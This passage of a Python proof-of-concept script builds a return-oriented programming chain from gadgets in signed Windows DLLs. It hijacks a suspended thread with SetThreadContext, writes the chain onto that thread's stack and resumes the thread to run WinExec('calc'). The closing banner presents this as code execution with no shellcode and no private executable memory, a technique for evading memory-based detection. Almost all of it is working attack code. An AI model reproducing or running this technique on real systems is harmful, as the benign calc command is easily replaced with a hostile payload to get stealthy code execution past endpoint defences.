            
            # But fibers still start execution at an address we provide
            # That address would need to be in executable memory
            # Unless... we point it to a gadget inside ntdll/kernel32?
            
            # What if we point the fiber start to a 'ret' gadget?
            # Then the return address on the fiber's stack determines flow
            
            ret_gadget = gadgets['ret'][0].address if gadgets.get('ret') else None
            
            if ret_gadget:
                print(f"    Using 'ret' gadget as fiber entry: 0x{ret_gadget:X}")
                print("    Fiber's initial RSP will hit our chain...")
                
                # This is getting complex - let's try the simpler SetThreadContext approach
        
        # =====================================================================
        # ACTUAL EXECUTION via SetThreadContext
        # =====================================================================
        
        print("\n[*] Attempting execution via SetThreadContext...")
        
        # Define CONTEXT structure for x64
        class M128A(ctypes.Structure):
            _fields_ = [("Low", ctypes.c_ulonglong), ("High", ctypes.c_longlong)]
        
        class CONTEXT(ctypes.Structure):
            _fields_ = [
                ("P1Home", ctypes.c_ulonglong),
                ("P2Home", ctypes.c_ulonglong),
                ("P3Home", ctypes.c_ulonglong),
                ("P4Home", ctypes.c_ulonglong),
                ("P5Home", ctypes.c_ulonglong),
                ("P6Home", ctypes.c_ulonglong),
                ("ContextFlags", ctypes.c_ulong),
                ("MxCsr", ctypes.c_ulong),
                ("SegCs", ctypes.c_ushort),
                ("SegDs", ctypes.c_ushort),
                ("SegEs", ctypes.c_ushort),
                ("SegFs", ctypes.c_ushort),
                ("SegGs", ctypes.c_ushort),
                ("SegSs", ctypes.c_ushort),
                ("EFlags", ctypes.c_ulong),
                ("Dr0", ctypes.c_ulonglong),
                ("Dr1", ctypes.c_ulonglong),
                ("Dr2", ctypes.c_ulonglong),
                ("Dr3", ctypes.c_ulonglong),
                ("Dr6", ctypes.c_ulonglong),
                ("Dr7", ctypes.c_ulonglong),
                ("Rax", ctypes.c_ulonglong),
                ("Rcx", ctypes.c_ulonglong),
                ("Rdx", ctypes.c_ulonglong),
                ("Rbx", ctypes.c_ulonglong),
                ("Rsp", ctypes.c_ulonglong),
                ("Rbp", ctypes.c_ulonglong),
                ("Rsi", ctypes.c_ulonglong),
                ("Rdi", ctypes.c_ulonglong),
                ("R8", ctypes.c_ulonglong),
                ("R9", ctypes.c_ulonglong),
                ("R10", ctypes.c_ulonglong),
                ("R11", ctypes.c_ulonglong),
                ("R12", ctypes.c_ulonglong),
                ("R13", ctypes.c_ulonglong),
                ("R14", ctypes.c_ulonglong),
                ("R15", ctypes.c_ulonglong),
                ("Rip", ctypes.c_ulonglong),
                ("FltSave", ctypes.c_ubyte * 512),
                ("VectorRegister", M128A * 26),
                ("VectorControl", ctypes.c_ulonglong),
                ("DebugControl", ctypes.c_ulonglong),
                ("LastBranchToRip", ctypes.c_ulonglong),
                ("LastBranchFromRip", ctypes.c_ulonglong),
                ("LastExceptionToRip", ctypes.c_ulonglong),
                ("LastExceptionFromRip", ctypes.c_ulonglong),
            ]
        
        CONTEXT_FULL = 0x10000B
        CREATE_SUSPENDED = 0x4
        
        # Set up API calls
        self.kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
        self.kernel32.CreateThread.restype = ctypes.c_void_p
        
        self.kernel32.GetThreadContext.argtypes = [ctypes.c_void_p, ctypes.POINTER(CONTEXT)]
        self.kernel32.GetThreadContext.restype = ctypes.c_bool
        
        self.kernel32.SetThreadContext.argtypes = [ctypes.c_void_p, ctypes.POINTER(CONTEXT)]
        self.kernel32.SetThreadContext.restype = ctypes.c_bool
        
        self.kernel32.ResumeThread.argtypes = [ctypes.c_void_p]
        self.kernel32.ResumeThread.restype = ctypes.c_ulong
        
        # Find a simple 'ret' gadget to use as initial thread start
        ret_gadget = gadgets['ret'][0].address
        
        print(f"    Creating suspended thread at ret gadget: 0x{ret_gadget:X}")
        
        # Create a thread in suspended state
        thread_id = ctypes.c_ulong()
        thread_handle = self.kernel32.CreateThread(
            None,
            0,
            ret_gadget,  # Start at a 'ret' instruction
            None,
            CREATE_SUSPENDED,
            ctypes.byref(thread_id)
        )
        
        if not thread_handle:
            print(f"    CreateThread failed: {ctypes.get_last_error()}")
        else:
            print(f"    Thread created: handle=0x{thread_handle:X}, id={thread_id.value}")
            
            # Get the thread context
            ctx = CONTEXT()
            ctx.ContextFlags = CONTEXT_FULL
            
            if self.kernel32.GetThreadContext(thread_handle, ctypes.byref(ctx)):
                print(f"    Original RSP: 0x{ctx.Rsp:X}")
                print(f"    Original RIP: 0x{ctx.Rip:X}")
                
                # KEY FIX: Write the chain to the THREAD'S ACTUAL STACK
                # Not to a heap allocation!
                # WinExec validates that RSP is within the TEB's stack limits.
                
                original_rsp = ctx.Rsp
                
                # Calculate payload size first (chain + string)
                # We need to know this before calculating new_rsp
                CMD_STRING = b"calc\x00"
                while len(CMD_STRING) % 8 != 0:
                    CMD_STRING += b"\x00"
                
                base_chain_size = len(builder.chain) * 8
                total_payload_size = base_chain_size + len(CMD_STRING)
                
                # Calculate new RSP position
                # Stack grows DOWN, so:
                # - Our chain data needs to be at RSP and above
                # - Function calls (WinExec etc) will use stack BELOW RSP
                #
                # We want RSP close to original_rsp but with our data above it.
                # Actually, RSP points to first item to pop, and stack grows down.
                # 
                # Better approach: Use original_rsp - small_offset as our RSP
                # The chain data at RSP will be read (popped), and WinExec
                # will have the full original stack space below for its calls.
                #
                # Let's put our chain at original_rsp - 0x200 (aligned)
                # This leaves ~0x200 bytes of our chain above that point
                # And the ENTIRE original stack below for function calls
                
                new_rsp = (original_rsp - 0x200) & ~0xF
                
                # String goes at new_rsp + chain_size
                string_addr = new_rsp + base_chain_size
                print(f"    Command string will be at: 0x{string_addr:X}")
                print(f"    Stack space below RSP for function calls: lots (original stack)")
                
                # Patch the placeholder in slot [0] with actual string address
                # BUT only for WinExec - other tests have their own values at slot 0
                patched_chain = list(builder.chain)
                
                if not USE_SLEEP_TEST and not USE_SIMPLE_TEST and not USE_BEEP_TEST and not USE_GETPID_TEST and not USE_BEEP_CONTEXT and not USE_WINEXEC_CONTEXT:
                    # WinExec test - patch slot 0 with string address
                    patched_chain[0] = string_addr
                    print(f"    Using STACK string at: 0x{string_addr:X} (local to RSP)", flush=True)
                else:
                    # Sleep/Simple/Beep test - keep original value
                    print(f"    Keeping slot[0] = 0x{patched_chain[0]:X} (not patching)", flush=True)
                
                # Show patched chain
                print(f"\n    Patched ROP Chain (on stack):")
                print(f"    [0] 0x{patched_chain[0]:016X}")
                for i in range(1, min(5, len(patched_chain))):
                    print(f"    [{i}] 0x{patched_chain[i]:016X}")
                print(f"    ...")
                
                # Build bytes manually
                chain_bytes = b''.join([struct.pack('<Q', x) for x in patched_chain])
                
                # Append the command string
                full_payload = chain_bytes + CMD_STRING
                payload_size = len(full_payload)
                
                print(f"    Chain size: {base_chain_size} bytes")
                print(f"    Full payload size: {payload_size} bytes (chain + string)")
                print(f"    Writing to thread stack at: 0x{new_rsp:X}")
                
                # Write payload to the thread's stack using WriteProcessMemory
                # (We need current process handle)
                current_process = self.kernel32.GetCurrentProcess()
                self.kernel32.GetCurrentProcess.restype = ctypes.c_void_p
                current_process = self.kernel32.GetCurrentProcess()
                
                # WriteProcessMemory setup
                self.kernel32.WriteProcessMemory.argtypes = [
                    ctypes.c_void_p,  # hProcess
                    ctypes.c_void_p,  # lpBaseAddress
                    ctypes.c_void_p,  # lpBuffer
                    ctypes.c_size_t,  # nSize
                    ctypes.POINTER(ctypes.c_size_t)  # lpNumberOfBytesWritten
                ]
                self.kernel32.WriteProcessMemory.restype = ctypes.c_bool
                
                bytes_written = ctypes.c_size_t(0)
                write_result = self.kernel32.WriteProcessMemory(
                    current_process,
                    new_rsp,
                    full_payload,
                    payload_size,
                    ctypes.byref(bytes_written)
                )
                
                if not write_result:
                    print(f"    WriteProcessMemory failed: {ctypes.get_last_error()}")
                    # Fallback: try direct memmove (same process)
                    print("    Trying direct memmove...")
                    ctypes.memmove(new_rsp, full_payload, payload_size)
                    print(f"    Direct write completed")
                else:
                    print(f"    Wrote {bytes_written.value} bytes to thread stack")
                
                # Verify write - check first QWORD (should be string address)
                verify_buf = (ctypes.c_ubyte * 8)()
                ctypes.memmove(verify_buf, new_rsp, 8)
                first_qword = int.from_bytes(bytes(verify_buf), 'little')
                print(f"    Verify: First QWORD = 0x{first_qword:X} (string addr, expected 0x{string_addr:X})")
                
                # Verify string is there
                verify_str = (ctypes.c_ubyte * 16)()
                ctypes.memmove(verify_str, string_addr, 16)
                print(f"    Verify: String at 0x{string_addr:X} = {bytes(verify_str)}")
                
                # Set context: RSP to new stack location, RIP to first gadget
                first_gadget = builder._get_gadget('pop_rcx')
                
                ctx.Rsp = new_rsp
                ctx.Rip = first_gadget
                
                # For BEEP_CONTEXT test, set RCX and RDX directly
                if USE_BEEP_CONTEXT:
                    ctx.Rcx = 750   # frequency
                    ctx.Rdx = 500   # duration
                    # Don't start at pop_rcx - start at the first ret gadget
                    # Actually, we need to skip the pop_rcx since we're setting RCX directly
                    # Let's start at a ret gadget instead
                    ctx.Rip = builder._get_gadget('ret')
                    print(f"    BEEP_CONTEXT: RCX=750, RDX=500 set in CONTEXT")
                    print(f"    New RIP: 0x{ctx.Rip:X} (ret gadget, skip pop_rcx)")
                elif USE_WINEXEC_CONTEXT:
                    ctx.Rcx = self._winexec_string_addr  # pointer to "calc"
                    ctx.Rdx = 1   # SW_SHOWNORMAL
                    ctx.Rip = builder._get_gadget('ret')
                    print(f"    WINEXEC_CONTEXT: RCX=0x{ctx.Rcx:X} ('calc'), RDX=1")
                    print(f"    New RIP: 0x{ctx.Rip:X} (ret gadget)")
                else:
                    print(f"    New RSP: 0x{ctx.Rsp:X} (on thread's stack)")
                    print(f"    New RIP: 0x{ctx.Rip:X} (pop rcx; ret)")
                
                # Set the new context
                if self.kernel32.SetThreadContext(thread_handle, ctypes.byref(ctx)):
                    print("    Context modified successfully!")
                    
                    print("\n" + "=" * 70)
                    print("EXECUTING ROP CHAIN")
                    print("=" * 70)
                    print()
                    print("    All code executes within signed kernel32.dll/ntdll.dll")
                    print("    Only DATA (the chain) is in private memory")
                    print("    Resuming thread in 2 seconds...")
                    print()
                    
                    import time
                    time.sleep(2)
                    
                    # Resume the thread - this starts the ROP chain!
                    result = self.kernel32.ResumeThread(thread_handle)
                    print(f"    ResumeThread returned: {result}", flush=True)
                    
                    # Wait for it with timeout
                    print("    Waiting for thread...", flush=True)
                    wait_result = self.kernel32.WaitForSingleObject(thread_handle, 30000)  # 30 sec
                    
                    if wait_result == 0:
                        print("    Thread completed normally", flush=True)
                    elif wait_result == 258:  # WAIT_TIMEOUT
                        print("    Thread timed out (might still be running)", flush=True)
                    else:
                        print(f"    WaitForSingleObject returned: {wait_result}", flush=True)
                    
                    # Get exit code
                    exit_code = ctypes.c_ulong()
                    self.kernel32.GetExitCodeThread.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
                    self.kernel32.GetExitCodeThread(thread_handle, ctypes.byref(exit_code))
                    print(f"    Thread exit code: {exit_code.value} (0x{exit_code.value:X})", flush=True)
                    
                    # Diagnose exit code
                    if exit_code.value == 0xC0000005:
                        print("\n    [-] CRASH: Access Violation")
                        print("        Check stack alignment or gadget addresses")
                    elif exit_code.value == 0x99:
                        print("\n    [+] SUCCESS! Chain completed with marker 0x99!")
                        print("        WinExec executed and returned successfully!")
                    elif exit_code.value == 0x42:
                        print("\n    [+] Simple test SUCCESS! ExitThread(0x42) worked!")
                    elif exit_code.value == 0:
                        print("\n    [?] Exit code 0 - Chain ran but WinExec may have failed")
                        print("        Or ExitThread(0) was called")
                    elif exit_code.value == 259:  # STILL_ACTIVE
                        print("\n    [?] Thread still running (STILL_ACTIVE)")
                    else:
                        print(f"\n    [?] Unexpected exit code: {exit_code.value}")
                    
                    import time
                    print("\n    Waiting 3 more seconds for any UI to appear...")
                    time.sleep(3)
                    
                    print("\n    Chain execution complete!")
                    print("    If calc.exe appeared, we succeeded.")
                else:
                    print(f"    SetThreadContext failed: {ctypes.get_last_error()}")
            else:
                print(f"    GetThreadContext failed: {ctypes.get_last_error()}")
            
            # Cleanup thread
            self.kernel32.CloseHandle(thread_handle)
        
        print("\n" + "=" * 70)
        print("PROOF OF CONCEPT COMPLETE")
        print("=" * 70)
        print("""
What we demonstrated:

1. All gadgets (pop rcx, pop rdx, ret, etc.) are INSIDE signed DLLs
2. The only "private" memory contains DATA (addresses), not CODE  
3. SetThreadContext pivots execution to our chain
4. The CPU executes instructions within kernel32/ntdll image memory
5. WinExec("calc") runs using Microsoft's own code

This is OIS-ROP: Offset Instruction Set via Return-Oriented Programming.
No shellcode. Just addresses. All execution in signed Image memory.
""")
        
        # Clean up
        self.kernel32.VirtualFree(ctypes.c_void_p(chain_mem), 0, MEM_RELEASE)
        
        return True


def main():
    print("=" * 70)
    print("OIS-ROP COMPLETE EXECUTOR")
    print("=" * 70)
    print()
    print("Executing code using ONLY gadgets in signed Microsoft DLLs.")
    print("No shellcode. No RWX memory. Just addresses.")
    print()
    
    executor = ROPExecutor()
    executor.execute_winexec_calc()


if __name__ == "__main__":
    main()
